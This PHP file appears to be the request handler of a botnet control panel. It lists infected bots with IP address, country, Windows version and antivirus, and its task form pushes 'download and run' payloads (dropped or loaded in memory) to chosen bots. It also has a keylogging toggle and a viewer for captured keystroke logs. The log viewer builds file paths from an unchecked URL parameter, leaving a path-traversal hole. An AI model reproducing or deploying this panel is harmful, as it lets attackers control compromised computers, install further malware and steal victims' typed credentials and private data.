<?php
session_start();
include_once("config.php");
include_once("db_req.php");
include_once("funcs.php");

check_user_logged_or_login();
$db = new db_req;
if($db->connect() && isset($_GET["reqt"]))
{
    switch($_GET["reqt"])
    {
        case REQUEST_DASHBOARD:
            $_SESSION["nav"] = REQUEST_DASHBOARD;
            $dash = $db->get_dashboard();
            ?>
<div class="container-fluid">
    <div class="row">
        <div class="col-lg-3 col-md-6 col-sm-6 col-xs-12">
            <div class="th-block th-block-dashb">
                <div class="th-block-dashb-items">
                    <div class="th-d-inline-block">
                        <div class="th-block-dashb-value"><?php echo $dash["bots_active"]; ?></div>
                        <div class="th-block-dashb-title">ACTIVE BOTS</div>
                    </div>
                    <div class="th-d-inline-block th-float-right">
                        <i class="fa fa-user th-block-dashb-icon"></i>
                    </div>
                </div>
                <div class="progress th-block-dashb-progress">
                    <div class="progress-bar th-block-dashb-progress-bar" role="progressbar" aria-valuemin="0" aria-valuemax="100" style="width: <?php echo ($dash["bots_active"] * 100) / $dash["bots_total"]; ?>%;"></div>
                </div>
            </div>
        </div>
        <div class="col-lg-3 col-md-6 col-sm-6 col-xs-12">
            <div class="th-block th-block-dashb">
                <div class="th-block-dashb-items">
                    <div class="th-d-inline-block">
                        <div class="th-block-dashb-value"><?php echo $dash["bots_online"]; ?></div>
                        <div class="th-block-dashb-title">BOTS ONLINE</div>
                    </div>
                    <div class="th-d-inline-block th-float-right">
                        <i class="fa fa-user th-block-dashb-icon"></i>
                    </div>
                </div>
                <div class="progress th-block-dashb-progress">
                    <div class="progress-bar th-block-dashb-progress-bar" role="progressbar" aria-valuemin="0" aria-valuemax="100" style="width: <?php echo ($dash["bots_online"] * 100) / $dash["bots_total"]; ?>%;"></div>
                </div>
            </div>
        </div>
        <div class="col-lg-3 col-md-6 col-sm-6 col-xs-12">
            <div class="th-block th-block-dashb">
                <div class="th-block-dashb-items">
                    <div class="th-d-inline-block">
                        <div class="th-block-dashb-value"><?php echo $dash["saved_logs"]; ?></div>
                        <div class="th-block-dashb-title">SAVED LOGS</div>
                    </div>
                    <div class="th-d-inline-block th-float-right">
                        <i class="fa fa-database th-block-dashb-icon"></i>
                    </div>
                </div>
                <div class="progress th-block-dashb-progress">
                    <div class="progress-bar th-block-dashb-progress-bar" role="progressbar" aria-valuemin="0" aria-valuemax="100" style="width: <?php echo ($dash["tasks_active"] * 100) / $dash["tasks_total"]; ?>%;"></div>
                </div>
            </div>
        </div>
        <div class="col-lg-3 col-md-6 col-sm-6 col-xs-12">
            <div class="th-block th-block-dashb">
                <div class="th-block-dashb-items">
                    <div class="th-d-inline-block">
                        <div class="th-block-dashb-value"><?php echo $dash["tasks_active"]; ?></div>
                        <div class="th-block-dashb-title">ACTIVE TASKS</div>
                    </div>
                    <div class="th-d-inline-block th-float-right">
                        <i class="fa fa-tasks th-block-dashb-icon"></i>
                    </div>
                </div>
                <div class="progress th-block-dashb-progress">
                    <div class="progress-bar th-block-dashb-progress-bar" role="progressbar" aria-valuemin="0" aria-valuemax="100" style="width: <?php echo ($dash["tasks_active"] * 100) / $dash["tasks_total"]; ?>%;"></div>
                </div>
            </div>
        </div>
    </div>
    <div class="row">
        <div class="col-lg-12">
            <div class="th-block">
            <div class="row">
                <div class="col-lg-6 col-md-6 col-sm-12 col-xs-12">
                    <div id="world-map" style="width: 100%; height: 360px"></div>
                </div>
                <div class="col-lg-6 col-md-6 col-sm-12 col-xs-12">
                    <div class="table-responsive">
                        <table class="table table-responsive table-hover">
                        <thead>
                            <tr>
                                <th>#</th>
                                <th>Country</th>
                                <th>Total</th>
                                <th>Active</th>
                                <th>Online</th>
                                <th>Lost</th>
                            </tr>
                        </thead>
                        <tbody><?php
            foreach($dash["country_list"] as $i => $d) {?>
                <tr>
                    <td><?php echo $i + 1; ?></td>
                    <td><?php echo ($d["code"] == "@@" ? "" : "<img src=\"images/" . $d["code"]. ".png\"/>" ) . " " . $d["name"]; ?></td>
                    <td><?php echo $d["total"]; ?></td>
                    <td><?php echo $d["active"]; ?></td>
                    <td><?php echo $d["online"]; ?></td>
                    <td><?php echo $d["lost"]; ?></td>
                </tr>      
<?php       
            }
?>
                        </tbody>
                        </table>
                    </div>
                </div>
            </div>
            </div>
        </div>
    </div>
</div>
<script>
    $(function () {
        $("#world-map").vectorMap(
        {
            map: "world_mill",
            backgroundColor: "#1C2021",
            series: {
                regions: [{
                    values: {
<?php       
            echo isset($dash["country_list"][0]) ? "\"" . strtoupper($dash["country_list"][0]["code"]) . "\": \"#bfa1eb\"" : "";
            echo isset($dash["country_list"][1]) ? ",\"" . strtoupper($dash["country_list"][1]["code"]) . "\": \"#ac85e5\"" : "";
            echo isset($dash["country_list"][2]) ? ",\"" . strtoupper($dash["country_list"][2]["code"]) . "\": \"#9969df\"" : "";
            echo isset($dash["country_list"][3]) ? ",\"" . strtoupper($dash["country_list"][3]["code"]) . "\": \"#864dd9\"" : "";
            echo isset($dash["country_list"][4]) ? ",\"" . strtoupper($dash["country_list"][4]["code"]) . "\": \"#7331d3\"" : "";
            echo isset($dash["country_list"][5]) ? ",\"" . strtoupper($dash["country_list"][5]["code"]) . "\": \"#6328ba\"" : "";
            echo isset($dash["country_list"][6]) ? ",\"" . strtoupper($dash["country_list"][6]["code"]) . "\": \"#54229e\"" : "";
            echo isset($dash["country_list"][7]) ? ",\"" . strtoupper($dash["country_list"][7]["code"]) . "\": \"#461c82\"" : "";
            echo isset($dash["country_list"][8]) ? ",\"" . strtoupper($dash["country_list"][8]["code"]) . "\": \"#371666\"" : "";
            echo isset($dash["country_list"][9]) ? ",\"" . strtoupper($dash["country_list"][9]["code"]) . "\": \"#bfa1eb\"" : "";
?>
                    },
                    attribute: 'fill'
                }]
            }
        });
    });
</script>
<?php
            break;
        case REQUEST_BOTS:
            $_SESSION["nav"] = REQUEST_BOTS;
?>

<script type="text/javascript">

    $("#bots-s-form").submit(function (e) {
        $.get("req.php?reqt=" + <?php echo REQUEST_SBOTS; ?>, $("#bots-s-form").serialize(), function (data, status) {
            if (status == "success") {
                $("#bots-tbody").html(data);
            }
        });
        e.preventDefault();
    });

</script>
<div class="container-fluid">
    <div class="row">
        <div class="col-lg-12">
            <div class="th-block th-block-page">
                <form action="page.php" id="bots-s-form" method="get" >
                    <div class="form-group row">
                        <label class="col-sm-2 col-form-label">Bot ID: </label>
                        <div class="col-sm-10">
                            <input name="bots-s-botid" type="text" class="form-control input-sm" value="*">
                        </div>
                    </div>
                    <div class="form-group row">
                        <label class="col-sm-2 col-form-label">Country: </label>
                        <div class="col-sm-10">
                            <input name="bots-s-country" type="text" class="form-control input-sm" value="*">
                        </div>
                    </div>
                    <div class="form-group row">
                        <label class="col-sm-2 col-form-label">Operating System: </label>
                        <div class="col-sm-10">
                            <select name="bots-s-os" class="form-control input-sm">
                                <option value="*">All</option>
                                <option value="<?php echo WINDOWS_XP; ?>">Windows XP</option>
                                <option value="<?php echo WINDOWS_VISTA; ?>">Windows Vista</option>
                                <option value="<?php echo WINDOWS_7; ?>">Windows 7</option>
                                <option value="<?php echo WINDOWS_8; ?>">Windows 8</option>
                                <option value="<?php echo WINDOWS_8_1; ?>">Windows 8.1</option>
                                <option value="<?php echo WINDOWS_10; ?>">Windows 10</option>
                            </select>
                        </div>
                    </div>
                    <div class="form-group row">
                        <label class="col-sm-2 col-form-label">Architecture: </label>
                        <div class="col-sm-10">
                            <select name="bots-s-arch" class="form-control input-sm">
                                <option value="*">All</option>
                                <option value="0">X86</option>
                                <option value="1">X64</option>
                            </select>
                        </div>
                    </div>
                    <div class="form-group row">
                        <div class="col-sm-12 col-md-2 col-md-offset-5 text-center">
                            <input type="submit" class="btn btn-primary" style="width:100%;" value="SEARCH"/>
                        </div>
                    </div>
                </form>
            </div>
            <div class="th-block th-block-page">
            <div class="table-responsive">
                <table class="table table-responsive table-hover">
                <thead>
                    <tr>
                        <th>#</th>
                        <th>ID</th>
                        <th>IP address</th>
                        <th>Country</th>
                        <th>Operating system</th>
                        <th>Antivirus</th>
                        <th>Last seen</th>
                        <th>Version</th>
                        <th>Status</th>
                    </tr>
                </thead>
                <tbody id="bots-tbody">
<?php
            $bots = $db->get_bots(0, 50);
            foreach($bots as $i => $d) {?>
                <tr>
                    <td><?php echo $i + 1; ?></td>
                    <td><?php echo $d["bot_id"]; ?></td>
                    <td><?php echo $d["ip_address"]; ?></td>
                    <td><?php echo $d["country_flag_path"]; echo $d["country_name"]; ?></td>
                    <td><?php echo $d["win_version"]; ?></td>
                    <td><?php echo $d["antivirus"]; ?></td>
                    <td><?php echo $d["last_seen"]; ?></td>
                    <td><?php echo $d["version"]; ?></td>
                    <td><?php echo $d["status"]; ?></td>
                </tr>
<?php       
            }
?>
                </tbody>
                </table>
            </div>
            </div>
        </div>
    </div>
</div>
<?php
            break;
        case REQUEST_TASK_MAN:
            $_SESSION["nav"] = REQUEST_TASK_MAN;
?>
<script type="text/javascript">
    function tasksel_handler() {
        v=document.getElementById("i-tm-nt-ldmethod");
        if(document.getElementById("i-task-sel").value == "downrun")
            v.style.display = "block";
        else
            v.style.display = "none";
    };
</script>
<div class="container-fluid">
    <div class="row">
        <div class="col-lg-12">
            <div class="th-block th-block-page">
            <ul class="nav nav-tabs">
                <li class="active"><a data-toggle="tab" href="#taskm-tl">Task List</a></li>
                <li><a data-toggle="tab" href="#taskm-nt">New Task</a></li>
            </ul>
            <div class="tab-content">
                <div id="taskm-tl" class="tab-pane fade in active">
                    <div class="table-responsive">
                        <table class="table table-responsive table-hover">
                        <thead>
                            <tr>
                                <th>#</th>
                                <th>Name</th>
                                <th>Action</th>
                                <th>Target ID</th>
                                <th>Max execution</th>
                                <th>Registration date</th>
                                <th>Status</th>
                                <th>Next action</th>
                            </tr>
                        </thead>
                        <tbody><?php
                    $tasks = $db->get_tasks(0, 50);
                    foreach($tasks as $i => $d) {?>
                        <tr>
                            <td><?php echo $i + 1; ?></td>
                            <td><?php echo $d["name"]; ?></td>
                            <td><?php echo $d["action"]; ?></td>
                            <td><?php echo $d["target_id"]; ?></td>
                            <td><?php echo $d["execution_count"] . " / " . ( $d["max_execution"] == 0 ? "unlimited" : $d["max_execution"] ) ?></td>
                            <td><?php echo $d["reg_date"]; ?></td>
                            <td><?php echo $d["status"]; ?></td>
                            <td><a class="btn btn-danger btn-xs" href="/page.php?hide_task=<?php echo $d['id']; ?>">Hide it</a> </td>
                        </tr>
        <?php       
                    }
        ?>
                        </tbody>
                        </table>
                    </div>
                </div>
                <div id="taskm-nt" class="tab-pane fade">
                    <form action="page.php" method="post">
                        <div class="form-group row">
                            <label class="col-sm-12 col-md-2 col-form-label">Action</label>
                            <div class="col-sm-10">
                                <select id="i-task-sel" name="tm-nt-action" onchange="tasksel_handler()" class="form-control input-sm">
                                    <option value="downrun">DOWNLOAD & RUN</option>
                                    <option value="updateapp">UPDATE APPLICATION</option>
                                </select>
                            </div>
                        </div>
                        <div id="i-tm-nt-ldmethod" class="form-group row">
                            <label class="col-sm-12 col-md-2 col-form-label">Load method</label>
                            <div class="col-sm-10">
                                <select name="tm-nt-ldmethod" class="form-control input-sm">
                                    <option value="<?php echo LOAD_DROP; ?>">DROPPING</option>
                                    <option value="<?php echo LOAD_MEM; ?>">MEMORY</option>
                                </select>
                            </div>
                        </div>
                        <div class="form-group row">
                            <label class="col-sm-12 col-md-2 col-form-label">Name</label>
                            <div class="col-sm-10">
                                <input name="tm-nt-name" type="text" class="form-control input-sm">
                            </div>
                        </div>
                        <div class="form-group row">
                            <label class="col-sm-12 col-md-2 col-form-label">Link</label>
                            <div class="col-sm-10">
                                <input name="tm-nt-link" type="text" class="form-control input-sm">
                            </div>
                        </div>
                        <div class="form-group row">
                            <label class="col-sm-12 col-md-2 col-form-label">Target ID</label>
                            <div class="col-sm-10">
                                <input name="tm-nt-targetid" type="text" class="form-control input-sm">
                            </div>
                        </div>
                        <div class="form-group row">
                            <label class="col-sm-12 col-md-2 col-form-label">Max. execution</label>
                            <div class="col-sm-10">
                                <input name="tm-nt-maxexecution" type="number" class="form-control input-sm" value="0">
                            </div>
                        </div>
                        <div class="form-group row">
                            <div class="col-sm-12 col-md-4 col-md-offset-4 text-center">
                                <input name="tm-nt-create" type="submit" class="btn btn-primary" style="width:100%;" value="CREATE">
                            </div>
                        </div>
                    </form>
                </div>
            </div>
            </div>
        </div>
    </div>
</div>
<?php
            break;
        case REQUEST_LOGS:
            $_SESSION["nav"] = REQUEST_LOGS;
?>
<script type="text/javascript">

    $("#logs-s-form").submit(function (e) {
        $.get("req.php?reqt=" + <?php echo REQUEST_SLOGS; ?>, $("#logs-s-form").serialize(), function (data, status) {
            if (status == "success") {
                $("#logs-tbody").html(data);
            }
        });
        e.preventDefault();
    });

    function getlog(id) {
        $.get("req.php?reqt=" + <?php echo REQUEST_LOGID; ?> + "&id=" + id, function (data, status) {
            if (status == "success") {
                $("#id-page-content").html(data);
            }
        });
    };

</script>
<div class="container-fluid">
    <div class="row">
        <div class="col-lg-12">
            <div class="th-block th-block-page">
                <form action="page.php" id="logs-s-form" class="form-horizontal" method="get" >
                    <div class="form-group row">
                        <label class="col-sm-12 col-md-2 col-form-label">Bot ID: </label>
                        <div class="col-sm-10">
                            <input name="logs-s-botid" type="text" class="form-control input-sm" value="*">
                        </div>
                    </div>
                    <div class="form-group row">
                        <div class="col-sm-12 col-md-2 col-md-offset-5 text-center">
                            <input type="submit" class="btn btn-primary" style="width:100%;" value="SEARCH"/>
                        </div>
                    </div>
                </form>
            </div>
            <div class="th-block th-block-page">
                <div class="table-responsive">
                    <table class="table table-responsive table-hover">
                    <thead>
                        <tr>
                            <th>#</th>
                            <th>Bot ID</th>
                            <th>Last update</th>
                            <th>Next action</th>
                        </tr>
                    </thead>
                    <tbody id="logs-tbody">
        <?php
            $logs = $db->get_logs(0, 50);
            foreach($logs as $i => $d) {?>
                        <tr>
                            <td><?php echo $i + 1; ?></td>
                            <td><?php echo $d["bot_id"]; ?></td>
                            <td><?php echo $d["last_update"]; ?></td>
                            <td><a class="btn btn-default btn-xs" onclick="getlog('<?php echo $d["bot_id"]; ?>')">View</a></td>
                        </tr>
        <?php
            }
        ?>
                    </tbody>
                    </table>
                </div>
            </div>
        </div>
    </div>
</div>
<?php
            break;
        case REQUEST_CONFIG:
            $_SESSION["nav"] = REQUEST_CONFIG;
            $config = $db->get_config();
?>
<div class="container-fluid">
    <div class="row">
        <div class="col-lg-12">
            <div class="th-block th-block-page">
                <form action="page.php" method="get">
                    <div class="form-group row">
                        <label class="col-sm-12 col-md-2 col-form-label">Bots interval:</label>
                        <div class="col-sm-12 col-md-4">
                            <input name="cf-bots-interval" type="number" class="form-control input-sm" value="<?php echo $config["bots_interval"]; ?>">
                        </div>
                    </div>
                    <div class="form-group row">
                        <label class="col-sm-12 col-md-2 col-form-label">Keylogging:</label>
                        <div class="col-sm-12 col-md-4">
                            <input name="cf-keylog-enabled" type="checkbox" class="form-control input-sm" <?php echo ($config["keylog_enabled"] ? "checked" : ""); ?>>
                        </div>
                    </div>
                    <div class="form-group row">
                        <div class="col-sm-12 col-md-2 col-md-offset-5 text-center">
                            <input name="cf-save" type="submit" class="btn btn-primary" style="width:100%;" value="SAVE"/>
                        </div>
                    </div>
                </form>
            </div>
        </div>
    </div>
</div>
<?php
            break;
        case REQUEST_SBOTS:

            $bots = $db->get_search_bots($_GET["bots-s-botid"], $_GET["bots-s-country"], $_GET["bots-s-os"], $_GET["bots-s-arch"], 0, 50);
            foreach($bots as $i => $d) {?>
                <tr>
                    <td><?php echo $i + 1; ?></td>
                    <td><?php echo $d["bot_id"]; ?></td>
                    <td><?php echo $d["ip_address"]; ?></td>
                    <td><?php echo $d["country_flag_path"]; echo $d["country_name"]; ?></td>
                    <td><?php echo $d["win_version"]; ?></td>
                    <td><?php echo $d["antivirus"]; ?></td>
                    <td><?php echo $d["reg_date"]; ?></td>
                    <td><?php echo $d["last_seen"]; ?></td>
                    <td><?php echo $d["status"]; ?></td>
                </tr>
<?php       
            }
            break;
        case REQUEST_SLOGS:

            $logs = $db->get_search_logs($_GET["logs-s-botid"], 0, 50);
            foreach($logs as $i => $d) {?>
                    <tr>
                        <td><?php echo $i + 1; ?></td>
                        <td><?php echo $d["bot_id"]; ?></td>
                        <td><?php echo $d["last_update"]; ?></td>
                    </tr>
<?php       
            }
            break;
        case REQUEST_LOGID: ?>
<div class="container-fluid">
    <div class="row">
        <div class="col-lg-12">
            <div class="th-block th-block-page">
<?php
            header("Content-Type: text/html; charset=utf-8");
            $file = "data/logs/" . $_GET["id"];
            if(isset($_GET["id"]) && file_exists($file))
            {
                $f = fopen($file, "rb");
                while (!feof($f)) 
                {
                    $data = iconv("unicode", "utf-8", fread($f, 1024));
                    echo str_replace("\n", "<br />", $data);
                    flush();
                }
                fclose($f);

            } else echo "not found";
?>
            </div>
        </div>
    </div>
</div>
<?php
            break;
    }
} else {
	print "error:" . $db->error();
}
?>